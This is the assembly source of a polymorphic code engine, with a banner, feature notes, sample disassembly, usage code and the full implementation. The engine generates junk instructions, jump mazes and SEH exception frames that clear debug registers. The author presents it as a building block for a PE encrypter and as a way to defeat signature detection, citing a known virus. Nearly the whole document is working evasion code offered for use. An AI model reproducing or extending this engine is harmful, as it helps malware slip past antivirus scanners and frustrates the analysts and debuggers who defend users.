comment $


               \`.  |\
              \`-. \ `.| \!,,
             \ \  `.\  _   (__
         _ `-.> \ ___   \    __		             ------------------------------------------		
          `-/,o-./O  `.      ._`			     Badf00d Polymorphic Engine
          -//   j_    |   `` _<`                     ------------------------------------------
           |\__(  \--'      '  \     .		       by Piotr Bania <bania.piotr@gmail.com>
           >   _    `--'      _/     ;                      http://pb.specialised.info
           |  / `----..   . /       (
           | (         `.  Y         ) 
            \ \     ,-.-.| |_       (_
             `.`.___\  \ \/=.`.     __)              a little bit of this, 
               `--,==\    )==\,\   (_                                     a little bit of that
                ,'\===`--'====\,\    `-.
              ,'.` ============\,\  (`-'
             /`=.`Y=============\,\ .'
            /`-. `|==============\_,-._
           /`-._`=|=___=========,'^, c-)
           \`-----+' ._)=====_(_`-' ^-'`-.
       -----`=====, \  `.-==(^_ ^c_,.^ `^_\-----
                 (__/`--'('(_,-._)-._,-.,__)`)  hjw
                          `-._`._______.'_.-'
                              `---------'



	
  Disclaimer__________________________________________________________________________________]

	Author takes no responsibility for any actions with provided informations or codes. 
	The copyright for any material created by the author is reserved. Any duplication of 
	codes or texts provided here in electronic or printed publications is not permitted 
	without the author's agreement. If you disagree - leave now!  
  


  Introduction________________________________________________________________________________]

	I must confess i was pretty bored and that's why i have written this engine. Meanwhile
	i was also thinking about some PE encrypter, so sooner or later i got to produce some
	poly engine for it. This little thingie was written in 2 days (few hours each day). 
	Current version is super beta, drop me an mail if you will find any errors.



  Features____________________________________________________________________________________]

	+ SEH frames generator (int3/sti/cli exceptions, BPM removers (dr0-3 cleaners), random 
	  registry usage, random size of garbage block (return address is calculated via size
	  of the generated junks), generated SEH block looks like this:


	  * SNIP *
		00402814   E8 3D000000      CALL pol.00402856
		00402819   8BD4             MOV EDX,ESP			; generated REG
		0040281B   81C2 0C000000    ADD EDX,0C 			
		00402821   8B12             MOV EDX,DWORD PTR DS:[EDX]  
		00402823   C782 04000000 00>MOV DWORD PTR DS:[EDX+4],0  
		0040282D   C782 08000000 00>MOV DWORD PTR DS:[EDX+8],0  
		00402837   C782 12000000 00>MOV DWORD PTR DS:[EDX+12],0 
		00402841   C782 16000000 00>MOV DWORD PTR DS:[EDX+16],0 
		0040284B   8182 B8000000 05>ADD DWORD PTR DS:[EDX+B8],5 ; calcs return addr
		00402855   C3               RETN
		00402856   33C9             XOR ECX,ECX
		00402858   64:FF31          PUSH DWORD PTR FS:[ECX]
		0040285B   64:8921          MOV DWORD PTR FS:[ECX],ESP
		0040285E   CC               INT3
		0040285F   AF               SCAS DWORD PTR ES:[EDI]
		00402860   C8 50C933        ENTER 0C950,33
		00402864   C0648F 00 5A     SHL BYTE PTR DS:[EDI+ECX*4],5A
	  * SNIP * 

	  As you can see doing only regswaping is not a good solution (still signature can be
	  generated - look RegSwap virus description), prolly it is better to mix randomly SEH 
	  instructions with garbage. Use your imagination.


	+ safe garbage generator (generates stepable garbage code, moreover user can specyfi
	  what registers should be used and what should be not, this feature gives an 
	  advantage to mix original code together with garbage code, without destroying the 
          values from orginal one), like this snipet shows:


	  * SNIP - ALL REGS ALLOWED *
		00402814   F7D2             NOT EDX
		00402816   D1D3             RCL EBX,1
		00402818   9B               WAIT
		00402819   9B               WAIT
		0040281A   D1F9             SAR ECX,1
		0040281C   93               XCHG EAX,EBX
		0040281D   81C3 B9B1F0A8    ADD EBX,A8F0B1B9
		00402823   F9               STC
		00402824   81EF 73D13C4E    SUB EDI,4E3CD173
		0040282A   3BC7             CMP EAX,EDI
		0040282C   FD               STD
		0040282D   2BC6             SUB EAX,ESI
		0040282F   57               PUSH EDI
		00402830   81C9 6FA7215F    OR ECX,5F21A76F
		00402836   33F3             XOR ESI,EBX
		00402838   F7D8             NEG EAX
		0040283A   1BCE             SBB ECX,ESI
	  * SNIP - ALL REGS ALLOWED *

 
	  * SNIP - ALLOWED EAX/EBX *
		00402814   F7DB             NEG EBX
		00402816   F7D0             NOT EAX
		00402818   85C3             TEST EBX,EAX
		0040281A   F8               CLC
		0040281B   90               NOP
		0040281C   C7C3 BB153882    MOV EBX,823815BB
		00402822   F7D8             NEG EAX
		00402824   09DB             OR EBX,EBX
		00402826   D1D3             RCL EBX,1
		00402828   D1D8             RCR EAX,1
		0040282A   EB 00            JMP SHORT pol.0040282C
		0040282C   81EB 011DAF21    SUB EBX,21AF1D01
		00402832   81E8 3BB25C3B    SUB EAX,3B5CB23B
		00402838   F8               CLC
	  * SNIP - ALLOWED EAX/EBX *


        + hardcore garbage generator (generates jmp over_garbage and generates garbage stepable
	  or totaly randomized - this one will be never executed), like here:


	  * SNIP - SOME GARBAGE CODE *
		00402810   EB 14            JMP SHORT pol.00402826
		00402812   CB               RETF                                     
		00402813   69A0 1C1E85D1 F9>IMUL ESP,DWORD PTR DS:[EAX+D1851E1C],886>
		0040281D   F2:              PREFIX REPNE:                            
		0040281E   4B               DEC EBX
		0040281F   85FF             TEST EDI,EDI
		00402821   198A 797CF6EB    SBB DWORD PTR DS:[EDX+EBF67C79],ECX
		00402827   0C C8            OR AL,0C8
	  * SNIP - SOME GARBAGE CODE *


        + backwards jumps generator (generates some funny jumps :))
	
	  * SNIP * 
		0040280C   EB 3A            JMP SHORT pol.00402848
		0040280E   33FE             XOR EDI,ESI
		00402810   EB 3B            JMP SHORT pol.0040284D
		00402812   AE               SCAS BYTE PTR ES:[EDI]
		00402813  ^73 C8            JNB SHORT pol.004027DD
		00402815   71 13            JNO SHORT pol.0040282A
		00402817   90               NOP
		00402818   5E               POP ESI
		00402819   C2 AFE0          RETN 0E0AF
		0040281C   BB 8406103D      MOV EBX,3D100684
		00402821   60               PUSHAD
		00402822   E5 77            IN EAX,77                               
		00402824   2AC4             SUB AL,AH
		00402826   59               POP ECX
		00402827   3E:5C            POP ESP                                  
		00402829   0E               PUSH CS
		0040282A   67:73 7A         JNB SHORT pol.004028A7                  
		0040282D   AF               SCAS DWORD PTR ES:[EDI]
		0040282E   27               DAA
		0040282F   0880 3B2E3EF3    OR BYTE PTR DS:[EAX+F33E2E3B],AL
		00402835   5D               POP EBP
		00402836   52               PUSH EDX
		00402837   D9FB             FSINCOS
		00402839  ^E1 BD            LOOPDE SHORT pol.004027F8
		0040283B   4E               DEC ESI
		0040283C   53               PUSH EBX
		0040283D   4D               DEC EBP
		0040283E   62D6             BOUND EDX,ESI                            
		00402840   A7               CMPS DWORD PTR DS:[ESI],DWORD PTR ES:[ED>
		00402841   FF49 8C          DEC DWORD PTR DS:[ECX-74]
		00402844   07               POP ES                                   
		00402845   56               PUSH ESI
		00402846   7A 15            JPE SHORT pol.0040285D
		00402848   9B               WAIT
		00402849  ^EB C5            JMP SHORT pol.00402810
		0040284B   6E               OUTS DX,BYTE PTR ES:[EDI]               
		0040284C   45               INC EBP
	  * SNIP * 


  TODO________________________________________________________________________________________]

 	+ code some multiple decryption routines (xlat/xor/etc. etc - backwards/forwards)
	+ add some checksum checker routines
	+ code new engine :))

 
  Sample_usage________________________________________________________________________________]

	* SNIP *
			call	random_setup			; set seed
			mov	ecx,30				; loop counter
			lea	edi,temp_buff			; EDI = where to store
	gen_it:			
			mov	eax,3
			call 	random_eax			; give random
			cmp	eax,0
			je	skip_jmp

			cmp	eax,1
			je	skip_sehs

			call	t_normalize_pops		; normalize stack before SEHs
			add	edi,eax

			call	gen_seh				; generate SEHs
			add	edi,eax				; add edi,generated_code_size
	skip_sehs:
			call	gen_bjumps			; generate backwards jumps
			add	edi,eax				; add edi,generated_code_size
	skip_jmp:
			mov	eax,2
			call	random_eax			; give random
			test	eax,eax
			jnz	gen_it2

			call	gen_garbage_i			; generate some stepable junk
			jmp	loopers				

	gen_it2:	
			call	hardcode_garbage_i		; generate some hard junks

	loopers:
			add	edi,eax				; add edi,generated_code_size
			loop	gen_it


			call	t_normalize_pops		; normalize stack if it wasn't
			add	edi,eax		                ; normalized
	* SNIP *



	Have phun, 
	Piotr Bania




$


M0_EAX			equ	0
M0_ECX			equ	1
M0_EDX			equ	2
M0_EBX			equ	3
M0_ESI			equ	4
M0_EDI			equ	5

M1_EAX			equ	0
M1_ECX			equ	1
M1_EDX			equ	2
M1_EBX			equ	3
M1_ESI			equ	6
M1_EDI			equ	7


M2_EAX			equ	0 shl 3
M2_ECX			equ	1 shl 3
M2_EDX			equ	2 shl 3
M2_EBX			equ	3 shl 3
M2_ESI			equ	6 shl 3
M2_EDI			equ	7 shl 3

; -------------- MAIN REGISTERS TABLES ----------------------------------------

x1_table:		db	M1_EAX
			db	M1_ECX
			db	M1_EDX
			db	M1_EBX
			db	M1_ESI
			db	M1_EDI
x1_tbl_size		=	$ - offset x1_table

x2_table:		db	M2_EAX
			db	M2_ECX
			db	M2_EDX
			db	M2_EBX
			db	M2_ESI
			db	M2_EDI
x2_tbl_size		=	$ - offset x2_table


; -------------- INSTRUCTION TABLES -------------------------------------------
; FORMAT:       (1 BYTE)  (BYTE)   (BYTE)  (BYTE)
; 		<OPCODE>  <MODRM>  <LEN>   <CSET>
; 
; if there is no MODRM, MODRM must be set to 2Dh (temp)

NO_M		equ	02dh
C_NONE		equ	0
C_SRC		equ	1
C_DST		equ	2
C_BOTH		equ	3



allowed_regs:	db	M0_EAX, M0_ECX, M0_EDX, M0_EBX, M0_ESI, M0_EDI
instr_table:	db	0f9h, NO_M, 1h, C_NONE			; stc
		db	0EBh, NO_M, 2h, C_NONE			; jmp $+1
		db  	0c7h, 0c0h, 6h, C_SRC			; mov reg(EAX),NUM
		db	08bh, 0c0h, 2h, C_BOTH			; mov reg(EAX),reg(EAX)
		db	081h, 0c0h, 6h, C_SRC			; add reg(EAX),NUM
		db	003h, 0c0h, 2h, C_BOTH			; add reg(EAX),reg(EAX)
		db	081h, 0e8h, 6h, C_SRC			; sub reg(EAX),NUM
		db	02bh, 0c0h, 2h,	C_BOTH			; sub reg(EAX),reg(EAX)
		db	040h, NO_M, 1h,	C_SRC			; inc reg(EAX)
		db	048h, NO_M, 1h, C_SRC			; dec reg(EAX)
_i_xor_r	db	033h, 0c0h, 2h, C_BOTH			; xor reg(EAX),reg(EAX)
		db	009h, 0c0h, 2h, C_BOTH			; or reg(EAX),reg(EAX)
		db	081h, 0c8h, 6h, C_SRC			; or reg(EAX),NUM
		db	03bh, 0c0h, 2h, C_BOTH
		db	085h, 0c0h, 2h, C_BOTH
		db	01bh, 0c0h, 2h, C_BOTH			; sbb reg(EAX),reg(EAX)
		db	011h, 0c0h, 2h, C_BOTH			; adc reg(EAX),reg(EAX)
		db	0f7h, 0d0h, 2h, C_SRC			; not reg(EAX)
		db	0f7h, 0d8h, 2h, C_SRC			; neg reg(EAX)
		db	0d1h, 0f8h, 2h, C_SRC			; sar reg(EAX),1
		db	0d1h, 0d8h, 2h, C_SRC			; rcr reg(EAX),1
		db	0d1h, 0d0h, 2h, C_SRC			; rcl reg(EAX),1		
		db	091h, NO_M, 1h, C_SRC			; xchg reg(EAX),reg(ECX)
		db	090h, NO_M, 1h, C_NONE			; nop
		db	0fch, NO_M, 1h, C_NONE			; cld
		db	0f8h, NO_M, 1h, C_NONE			; clc
		db	0fdh, NO_M, 1h, C_NONE			; std
		db	09bh, NO_M, 1h, C_NONE			; wait		
		db	050h, NO_M, 1h, C_SRC			; push reg(eax)
_i_pop		db	058h, NO_M, 1h, C_SRC			; pop reg(eax) (must be last one)
ENTRY_TABLE_SIZE	=	4
instr_table_size	=	(($-offset instr_table)/4)

		dd	0
push_number	dd	0
do_push		db	1					; should we process pushs?

O_JMP		equ	0EBh
O_PUSH		equ	050h
O_POP		equ	058h
i_jmp:		db	0EBh, NO_M, 2h 				; jmp $+1

		

; -------------- GARBAGE GENERATOR (SAFE) ------------------------------------
; EDI = where
; ----------------------------------------------------------------------------

gen_garbage_i:

		pushad
garbage_again:
		mov	eax,instr_table_size
		call	random_eax

		lea	esi,instr_table	
		mov	ecx,ENTRY_TABLE_SIZE
		mul	ecx				; eax=member from table to use
		add	esi,eax
		jmp	garbage_co

garbage_hand:	pushad
garbage_co:	lodsw					; ah = modrm value / al=opcode
		cmp	ah,NO_M
		je	no_modrm
		stosb					; store opcode
		xor	edx,edx
		mov	dl,ah
		cmp	byte ptr [esi+1],C_BOTH		; what registers to mutate
		je	p_01
		cmp	byte ptr [esi+1],C_SRC
		jne	t_01

p_01:		and	dl,0F8h		
		mov	eax,x1_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x1_table[eax]]
		or	dl,al
		mov	byte ptr [edi],dl

t_01:		cmp	byte ptr [esi+1],C_BOTH		; what registers to mutate
		je	p_02
		cmp	byte ptr [esi+1],C_DST
		jne	finish_i

p_02:		and	dl,0C7h	
		mov	eax,x2_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x2_table[eax]]
		or	dl,al				; update modrm value
		mov	byte ptr [edi],dl

finish_i:	mov	cl,byte ptr [esi]
		sub	cl,2
		inc	edi
		cmp	cl,0
		jle	garbage_done

store_op:	mov	eax,12345678h
		call	random_eax
		stosb				
		loop	store_op


garbage_done:	xor	eax,eax
		mov	al,byte ptr [esi]
		mov	[esp+PUSHA_STRUCT._EAX],eax
		popad
		ret
			
		
; ----------------------------------------------------
; NO MOD-RMs
; ----------------------------------------------------


no_modrm:	xor	edx,edx
		mov	dl,al

		cmp	byte ptr [esi+1],C_NONE
		je	t_none
		cmp	dl,O_PUSH
		je	t_push
		cmp	dl,O_POP
		je	t_pop 


go_nomodrm:	mov	eax,x1_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x1_table[eax]]
		and	dl,0F8h
		or	dl,al
		mov	byte ptr [edi],dl
		inc	edi
		jmp	finish_i
		
t_none:		mov	byte ptr [edi],dl
		inc	edi
		cmp	dl,O_JMP
		jne 	finish_i
		mov	byte ptr [edi],0
		inc	edi
		jmp 	finish_i		

t_push:		cmp	byte ptr [do_push],1
		jne	garbage_again
		inc	dword ptr [push_number]
		jmp	go_nomodrm

t_pop:		cmp	byte ptr [do_push],1
		jne	garbage_again

		cmp	dword ptr [push_number],0
		jle	garbage_again

		dec	dword ptr [push_number]
		jmp 	go_nomodrm



t_normalize_pops:

		pushad
		xor	ebx,ebx
		mov	ecx,dword ptr [push_number]
		test	ecx,ecx
		jz	t_opsexit
		
		
t_givepops:	lea	esi,_i_pop
		call	garbage_hand
		add	edi,eax
		add	ebx,eax
		loop	t_givepops

t_opsexit:	mov	[esp+PUSHA_STRUCT._EAX],ebx
		popad
		ret
		
		
; ---------------------------------------------------------------------------
; HARDCORE GARBAGER
; ---------------------------------------------------------------------------
; EDI = where to store 
;
; This one generates code like this:
; jmp over_garbage
; <totaly random generated garbage>
; <normal garbage>
; max: up to 20 "instructions"
; ---------------------------------------------------------------------------

hardcode_garbage_i:
		
		pushad
		mov	ebx,edi
		lea	edi,hardcore_temp
		mov	eax,20			
		call	random_eax
		mov	ecx,eax
		add	ecx,4

h_fill:		mov	eax,2
		call	random_eax
		test 	eax,eax
		jnz	h_hard
		call	gen_garbage_i
		jmp	h_cont

h_hard:		mov	eax,5
		call	random_eax
		mov	edx,eax
		inc	edx
		xor	esi,esi

h_hard_fill:	mov	eax,0FFFFh
		call	random_eax
		stosb
		inc	esi
		dec	edx
		jnz	h_hard_fill		
		loop	h_fill
		jmp	h_done

h_cont:		add	edi,eax
		loop	h_fill
	
h_done:		lea	ecx,hardcore_temp
		sub	edi,ecx
		mov	ecx,edi				
							
		mov	byte ptr [ebx],O_JMP
		inc	ebx
		mov	byte ptr [ebx],cl
		inc	ebx

		push	ecx
		mov	edi,ebx
		lea	esi,hardcore_temp
		rep	movsb
		pop	eax
		add	eax,2

		mov	[esp+PUSHA_STRUCT._EAX],eax
		popad
		ret

; -------------------------------------------------------------
; Generates backwards jumps
; -------------------------------------------------------------
; EDI = buffor

gen_bjumps:

		pushad
		mov	ebx,edi	
		mov	byte ptr [jmp_flag],0
		mov	byte ptr [jmp_flag_b],0
		mov	dword ptr [count_jmp],0
		mov	dword ptr [where_where],0
		mov	dword ptr [jmp_bytes],0
		mov	byte ptr [do_push],0
		mov	byte ptr [where_losed],0

		mov	byte ptr [ebx],O_JMP
		mov	dword ptr [where_start],ebx
		add	dword ptr [where_start],2
		inc	ebx
		
		xor	esi,esi
		add	edi,2			
		add	dword ptr [jmp_bytes],2

gen_gar_i:	mov	eax,20			
		call	random_eax
		mov	ecx,eax
		add	ecx,10
		
gen_gar_ii:	call 	gen_garbage_i
		add	dword ptr [jmp_bytes],eax
		add	esi,eax
		add	edi,eax
		cmp	byte ptr [jmp_flag],1
		jne	gen_gari_ix
		add	dword ptr [count_jmp],eax
		jmp	gen_gari_ixx

gen_gari_ix:	push	eax
		mov	eax,2
		call	random_eax
		mov	edx,eax
		pop	eax
		cmp	byte ptr [where_losed],1
		je	gen_gari_ixx
		add	dword ptr [where_start],eax
		cmp	edx,1
		je	gen_gari_ixx
		mov	byte ptr [where_losed],1		

gen_gari_ixx:	mov	eax,3
		call	random_eax
		cmp	eax,2
		jne	cont_gari
		cmp	byte ptr [jmp_flag],1
		je	cont_gari
		mov	byte ptr [jmp_flag],1
		mov	byte ptr [edi],O_JMP	
		inc	edi
		mov	dword ptr [where_jmp],edi
		inc	edi
		add	esi,2

cont_gari:	loop	gen_gar_ii
		mov	eax,esi
		mov	byte ptr [ebx],al
		cmp	byte ptr [jmp_flag],1
		je	cont_gari2
		mov	byte ptr [edi],O_JMP
		inc	edi
		mov	dword ptr [where_jmp],edi
		inc	edi

cont_gari2:	mov	dword ptr [where_where],edi			
		add	dword ptr [jmp_bytes],2
		mov	eax,5
		call	random_eax
		inc	eax
		mov	ecx,eax

cont_gari3:	call 	gen_garbage_i
		add	dword ptr [jmp_bytes],eax
		add	edi,eax
		add	dword ptr [count_jmp],eax
		loop	cont_gari3
		mov	byte ptr [edi],O_JMP
		mov	eax,edi
		sub	eax,dword ptr [where_start]
		add	eax,2
		neg	eax

		pushad
		add	edi,2
		mov	eax,4
		call	random_eax
		mov	ecx,eax
		test 	ecx,ecx
		jz	cont_gari4

place_gar:	mov	eax,0FFh
		call	random_eax
		inc	dword ptr [count_jmp]
		inc	dword ptr [jmp_bytes]
		stosb
		loop	place_gar


cont_gari4:	add	dword ptr [count_jmp],2
		mov	eax,dword ptr [count_jmp]
		mov	edx,dword ptr [where_jmp]
		mov	byte ptr [edx],al		
		popad
		mov	byte ptr [edi+1],al
		add	dword ptr [jmp_bytes],2
		mov	edx,dword ptr [where_where]
		sub	edx,dword ptr [where_jmp]
		dec	edx
		mov	ecx,edx
		mov	edx,dword ptr [where_jmp]
		inc	edx
		cmp	ecx,0
		jle 	cont_no_xor
				
cont_xor:	mov	eax,0FFh
		call	random_eax
		xor	byte ptr [edx],al
		inc	edx
		loop	cont_xor

cont_no_xor:	mov	byte ptr [do_push],1
		mov	edx,dword ptr [jmp_bytes]
		mov	[esp+PUSHA_STRUCT._EAX],edx
		popad
		ret

jmp_bytes	dd	0
where_losed	db	0
where_where	dd	0
where_start	dd	0
count_jmp	dd	0
where_jmp	dd	0
jmp_flag	db	0
jmp_flag_b	db	0





; -------------------------------------------------------------
; Generates SEH frames/exceptions/etc.
; -------------------------------------------------------------
; EDI = buffor


FS_PREFIX	equ	064h
seh_push_fs	db	0ffh, 030h, 2h, C_SRC
seh_mov_fs	db	089h, 020h, 2h, C_SRC
seh_pop_fs	db	08fh, 000h, 2h, C_SRC

_mov_reg_esp	db	08bh, 0c4h, 2h, C_DST		; mov reg,ESP
_add_reg_num	db	081h, 0c0h, 2h, C_SRC		; add reg,NUM (we must typo NUM by hand: 4) LEN=6
_mov_reg_oreg	db	08bh, 000h, 2h, C_BOTH		; mov reg,[REG]
_mov_dreg_num	db	0c7h, 080h, 2h, C_SRC		; mov [reg+NUM],0 (add NUM by hand) LEN: A
_add_dreg_num	db	081h, 080h, 2h, C_SRC

exception_table:
		db	0CCh				; int 3
		db	0fah				; cli
		db	0fbh				; sti
exception_table_size	= $-offset exception_table






gen_seh:
		pushad
		xor	edx,edx
		mov	ebx,edi
		mov	byte ptr [edi],0E8h		
		mov	dword ptr [edi+1],0
		add	edx,5
		add	edi,5
		push	edi
		lea 	esi,allowed_regs		
		mov	ecx,x1_tbl_size
		push	esi
		push	ecx
		lea	edi,allowed_regs_temp
		rep	movsb
		pop	ecx
		pop	edi

		pushad
		mov	eax,x1_tbl_size		  
		call	random_eax
		cmp	eax,M0_EAX
		jne	reg_p
		inc	eax			 ; somehow :) EAX usage results with invalid disposition error

reg_p:		rep	stosb
		mov	edi,[esp+PUSHA_STRUCT_SIZE]
		lea	esi,_mov_reg_esp			
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],eax
		add	[esp+PUSHA_STRUCT_SIZE],eax
		add	edi,eax
		lea	esi,_add_reg_num
		call	garbage_hand
		add	edi,2
		mov	dword ptr [edi],0Ch
		add	dword ptr [esp+PUSHA_STRUCT._EDX],6
		add	[esp+PUSHA_STRUCT_SIZE],6
		add	edi,4
		lea	esi,_mov_reg_oreg			
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],eax
		add	[esp+PUSHA_STRUCT_SIZE],eax
		add	edi,eax
		lea	esi,_mov_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah
		add	[esp+PUSHA_STRUCT_SIZE],0ah
		add	edi,2
		mov	dword ptr [edi],04h
		mov	dword ptr [edi+4],0h
		add	edi,0ah-2
		lea	esi,_mov_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah
		add	[esp+PUSHA_STRUCT_SIZE],0ah
		add	edi,2
		mov	dword ptr [edi],08h
		mov	dword ptr [edi+4],0h
		add	edi,0ah-2
		lea	esi,_mov_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah
		add	[esp+PUSHA_STRUCT_SIZE],0ah
		add	edi,2
		mov	dword ptr [edi],12h
		mov	dword ptr [edi+4],0h
		add	edi,0ah-2		
		lea	esi,_mov_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah
		add	[esp+PUSHA_STRUCT_SIZE],0ah
		add	edi,2
		mov	dword ptr [edi],16h
		mov	dword ptr [edi+4],0h
		add	edi,0ah-2		
		lea	esi,_add_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah+1
		add	[esp+PUSHA_STRUCT_SIZE],0ah+1
		add	edi,2
		mov	dword ptr [edi],0b8h
		add	edi,4
		mov	dword ptr [where_over],edi
		add	edi,0ah-6
		mov	byte ptr [edi],0C3h		; ret
		inc	edi
		popad
		mov	byte ptr [ebx+1],dl		
		sub	byte ptr [ebx+1],5
		mov	eax,x1_tbl_size			
		call	random_eax
		rep	stosb
		pop	edi
		lea	esi,_i_xor_r			
		call	garbage_hand
		add	edi,eax
		add	edx,eax
		mov	byte ptr [edi],FS_PREFIX
		inc	edi	
		inc	edx	
		lea	esi,seh_push_fs
		call	garbage_hand			
		add	edi,eax
		add	edx,eax
		mov	byte ptr [edi],FS_PREFIX	
		inc	edi
		inc	edx
		lea	esi,seh_mov_fs
		call	garbage_hand
		add	edi,eax
		add	edx,eax
		call	reset_regs
		xor	ebx,ebx
		mov	eax,exception_table_size
		call	random_eax
		mov	cl,byte ptr exception_table[eax]
		mov	byte ptr [edi],cl
		inc	edx
		inc	edi
		inc	ebx
		call	fill_trash
		add	edx,eax		
		add	ebx,eax
		add	edi,eax
		push	edi
		mov	edi,dword ptr [where_over]
		mov	dword ptr [edi],ebx
		pop	edi
		call	finalize_seh
		add	edx,eax
		mov	[esp+PUSHA_STRUCT._EAX],edx
		popad
		ret



where_over		dd	0
allowed_regs_temp	db	x1_tbl_size dup (0)




finalize_seh:
		pushad
		call	gen_regs
		xor	edx,edx
		lea	esi,_i_xor_r			
		call	garbage_hand
		add	edi,eax
		add	edx,eax
		mov	byte ptr [edi],FS_PREFIX
		inc	edi
		inc	edx
		lea	esi,seh_pop_fs
		call	garbage_hand			
		add	edi,eax
		add	edx,eax
		call	reset_regs
		inc	dword ptr [push_number]
		lea	esi,_i_pop
		call	garbage_hand			
		add	edx,eax
		add	edi,eax
		mov	[esp+PUSHA_STRUCT._EAX],edx		
		popad
		ret

fill_trash:	pushad
		xor	ebx,ebx
		mov 	eax,20
		call	random_eax
		mov	ecx,eax
		test	eax,eax
		jz 	done_fill_trash

fill_trash_x:	mov	eax,0FFh
		call	random_eax
		stosb
		inc	ebx
		loop	fill_trash_x

done_fill_trash:
		mov	[esp+PUSHA_STRUCT._EAX],ebx
		popad
		ret

reset_regs:
		pushad	
		lea	esi,allowed_regs_temp
		mov	ecx,x1_tbl_size
		lea	edi,allowed_regs
		rep	movsb
		popad
		ret


gen_regs:	pushad
		mov	eax,x1_tbl_size
		call	random_eax
		lea	edi,allowed_regs
		mov	ecx,x1_tbl_size
		rep	stosb		
		popad
		ret


set_random:	pushad
		mov	eax,6
		call	random_eax
		cmp	eax,5
		jne	not_set
		call	gen_bjumps		
		jmp	le_set

not_set:	xor	eax,eax
le_set:		mov	[esp+PUSHA_STRUCT._EAX],eax

		popad
		ret


random_setup			proc

		@callx GetTickCount
		mov Random_Seed,eax
		ret

random_setup			endp

Random_Seed			dd 0

random_eax			proc

                PUSH    ECX
                PUSH    EDX
                PUSH    EAX
		db      0Fh, 31h	       ; RDTSC
                MOV     ECX, Random_Seed  
                ADD     EAX, ECX  
                ROL     ECX, 1 
                ADD     ECX, 666h
                MOV     Random_Seed, ECX
	        PUSH    32
                POP     ECX

CRC_Bit:        SHR     EAX, 1      
                JNC     Loop_CRC_Bit
                XOR     EAX, 0EDB88320h

Loop_CRC_Bit:   LOOP    CRC_Bit 
                POP     ECX     
                XOR     EDX, EDX 
                DIV     ECX
                XCHG    EDX, EAX                
                OR      EAX, EAX                
                POP     EDX
                POP     ECX
                RETN
random_eax			  endp 
